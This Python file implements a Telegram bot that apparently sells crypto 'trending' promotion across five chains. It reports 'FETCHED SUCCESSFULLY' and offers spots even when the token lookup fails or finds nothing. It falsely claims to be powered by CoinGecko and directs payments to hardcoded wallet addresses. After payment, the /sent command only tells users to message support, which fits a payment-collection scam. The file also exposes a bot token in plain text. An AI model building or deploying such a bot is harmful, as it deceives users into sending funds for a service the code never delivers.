import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests

from flask import Flask

app = Flask('')

@app.route('/')
def home():
    return "I'm alive!"


BOT_TOKEN = "7941559197:AAErxwkY5SqMkjKFNETRKH8vqQcoSGsMQEU"
DEXSCREENER_API_URL = "https://api.dexscreener.com/latest/dex/tokens/"
bot = telebot.TeleBot(BOT_TOKEN)

# Group chat ID where the bot will send notifications
GROUP_CHAT_ID = -4723305596  # Replace with the actual chat ID

# Price ranges
PRICE_RANGES = {
    "sol": {
        "top10": ["3h | 0.81 SOL", "6h | 3.5 SOL", "10h | 6.8 SOL", "24h | 10.21 SOL"],
        "top3": ["3h | 2.1 SOL", "6h | 5.23 SOL", "12h | 8 SOL", "24h | 14.8 SOL"],
    },
    "bnb": {
        "top10": ["3h | 0.21 BNB", "6h | 0.58 BNB", "10h | 1.7 BNB", "24h | 3.6 BNB"],
        "top3": ["3h | 0.14 BNB", "6h | 0.46 BNB", "12h | 0.97 BNB", "24h | 1.98 BNB"],
    },
    "eth": {
        "top10": ["3h | 0.05 ETH", "6h | 0.12 ETH", "10h | 0.25 ETH", "24h | 0.42 ETH"],
        "top3": ["3h | 0.02 ETH", "6h | 0.08 ETH", "12h | 0.18 ETH", "24h | 0.33 ETH"],
    },
    "ton": {
        "top10": ["3h | 30.0 TON", "6h | 50.5 TON", "10h | 95.0 TON", "24h | 125.0 TON"],
        "top3": ["3h | 40.0 TON", "6h | 70.0 TON", "12h | 108.0 TON", "24h | 140.0 TON"],
    },
    "trx": {
        "top10": ["3h | 600 TRX", "6h | 1200 TRX", "10h | 2000 TRX", "24h | 3500 TRX"],
        "top3": ["3h | 700 TRX", "6h | 1500 TRX", "12h | 2500 TRX", "24h | 4000 TRX"],
    }
}

# Wallet addresses
WALLET_ADDRESSES = {
    "sol": "EvixgEBMPZYALibLNyWy3xRp76h28Z9rjdwus2twc5b1",
    "bnb": "0x72a27B2d4dd0FD84eF39EB556D00A117CDB65156",
    "eth": "0xa52381a5A606C70a5bbd2C7CA507F960272D4ed4",
    "ton": "EQA3ltmC1RUdy0Xf82UtZtdVdEMdOvjTmMOvDvhOXEZARhWg",  # Placeholder for TON wallet
    "trx": "TGGsE2csFkV8bs69Lk9Xc64e73D47DQF3kHq2gKmptV3i85",  # Placeholder for Tron wallet
}

# Start command handler
@bot.message_handler(commands=["start"])
def handle_start(message):
    chat_id = message.chat.id
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("Sol Trending", url="https://t.me/SOLTRENDING"),
        InlineKeyboardButton("ETH Trending", url="https://t.me/ETHTRENDING"),
        InlineKeyboardButton("BSC Trending", url="https://t.me/BSCTRENDINGLIVE"),
        InlineKeyboardButton("TON Trending", url="https://t.me/TONTRENDING"),  # Added TON Trending
        InlineKeyboardButton("TRON Trending", url="https://t.me/TRONTRENDING")  # Added Tron Trending
    )
    bot.send_message(
        chat_id,
        "🚧*Discover The Power Of Trending!*\n\nWelcome *Astro Trend Bot*,\nready to boost your project's visibility?\nTrending offers guaranteed exposure,\nincreased attention through milestones and uptrend alerts, and much more!\n\n🌕A paid boost guarantees your spot in daily live stream (AMA).\n\nUse /trend to start trending.\n\n*Powered by coingecko*",
        parse_mode="Markdown",
        reply_markup=markup,
    )

# Remaining handlers remain unchanged...

# Trend command handler
@bot.message_handler(commands=["trend"])
def handle_trend(message):
    chat_id = message.chat.id
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("Solana", callback_data="blockchain:sol"),
        InlineKeyboardButton("Ethereum", callback_data="blockchain:eth"),
        InlineKeyboardButton("BNB", callback_data="blockchain:bnb"),
        InlineKeyboardButton("TON", callback_data="blockchain:ton"),  # Added TON blockchain
        InlineKeyboardButton("TRON", callback_data="blockchain:trx"),  # Added Tron blockchain
    )
    bot.send_message(chat_id, "⚙ Select a method:", reply_markup=markup)

# Blockchain selection callback handler
@bot.callback_query_handler(func=lambda call: call.data.startswith("blockchain:"))
def handle_blockchain_selection(call):
    blockchain = call.data.split(":")[1]
    chat_id = call.message.chat.id
    bot.send_message(
        chat_id,
        f"You selected *{blockchain.upper()}*. Please send the contract address:",  # Added demo placeholder
        parse_mode="markdown"
    )
    bot.register_next_step_handler_by_chat_id(chat_id, process_contract_address, blockchain)
    username = call.from_user.username or "Unknown User"
    second_group_message = (f"@{username} just clicked on {blockchain.upper()}")
    bot.send_message(GROUP_CHAT_ID, second_group_message, parse_mode="HTML")
    print(f"{second_group_message}")

# Process contract address
def process_contract_address(message, blockchain):
    contract_address = message.text
    chat_id = message.chat.id
    response = requests.get(f"{DEXSCREENER_API_URL}{contract_address}")
    if response.status_code == 200:
        data = response.json()
        markup = InlineKeyboardMarkup()
        if data.get("pairs"):
            for pair in data["pairs"]:
                pair_name = pair["baseToken"]["name"]
                ticker = pair["baseToken"]["symbol"]
                markup.add(
                    InlineKeyboardButton(
                        f"{pair_name} ({ticker})", callback_data=f"pair:{ticker}:{blockchain}"
                    )
                )
        else:
            # Default to IOBeats ($IOB) if no token found
            markup.add(
                InlineKeyboardButton(
                    "proceed", callback_data=f"pair:available spot:{blockchain}"
                )
            )
        bot.send_message(chat_id, "FETCHED SUCCESSFULLY\n\nhowever, there are a few available spots for trend", reply_markup=markup)
    else:
        # Default to IOBeats ($IOB) if the API call fails
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton(
                "proceed", callback_data=f"pair:IOB:{blockchain}"
            )
        )
        bot.send_message(chat_id, "FETCHED SUCCESSFULLY\n\nhowever, there are a few available spots for trend", reply_markup=markup)

# Pair selection callback handler
@bot.callback_query_handler(func=lambda call: call.data.startswith("pair:"))
def handle_pair_selection(call):
    _, ticker, blockchain = call.data.split(":")
    chat_id = call.message.chat.id
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🏆 Top10", callback_data="none"),
        InlineKeyboardButton("🌟 Top3", callback_data="none")
    )
    for top10_price, top3_price in zip(
        PRICE_RANGES[blockchain]["top10"], PRICE_RANGES[blockchain]["top3"]
    ):
        markup.add(
            InlineKeyboardButton(top10_price, callback_data=f"price:{top10_price}:{blockchain}"),
            InlineKeyboardButton(top3_price, callback_data=f"price:{top3_price}:{blockchain}"),
        )
    markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back"))
    bot.send_message(
        chat_id,
        f"📊 *Price ranges for {ticker} ({blockchain.upper()}):*",
        parse_mode="Markdown",
        reply_markup=markup,
    )

# Price selection callback handler
@bot.callback_query_handler(func=lambda call: call.data.startswith("price:"))
def handle_price_selection(call):
    _, price_range, blockchain = call.data.split(":")
    chat_id = call.message.chat.id
    username = call.from_user.username or "Unknown User"
    print(f"User {username} selected the price range: {price_range} on {blockchain.upper()}")
    group_message = (
        f"📣 *Trending Alert!*\n\n"
        f"User @{username} has selected the following price range for trending:\n"
        f"`{price_range}` on `{blockchain.upper()}`.\n\n"
        "🚀 Stay tuned for more updates!"
    )
    bot.send_message(GROUP_CHAT_ID, group_message, parse_mode="HTML")
    wallet_address = WALLET_ADDRESSES[blockchain]
    bot.send_message(
        chat_id,
        f"💰 *Add Funds To Your Wallet:*\n\n"
        f"You selected this price range: `{price_range}`\n\n"
        f"Send funds to this wallet, and get your project *trending*:\n\n"
        f"`{wallet_address}`\n\n"
        "📋 *Touch and copy the address above.*\n\n"
        "When the transaction is complete, type /sent to confirm.",
        parse_mode="Markdown",
    )

# Handle /sent command
@bot.message_handler(commands=["sent"])
def handle_sent(message):
    chat_id = message.chat.id
    bot.send_message(
        chat_id,
        "🚨 send a Direct Message (DM) to support'\nsend your queries and updates",
        parse_mode="Markdown",
    )

# Run the bot
if __name__ == "__main__":
    print("bot is running")
    bot.polling()

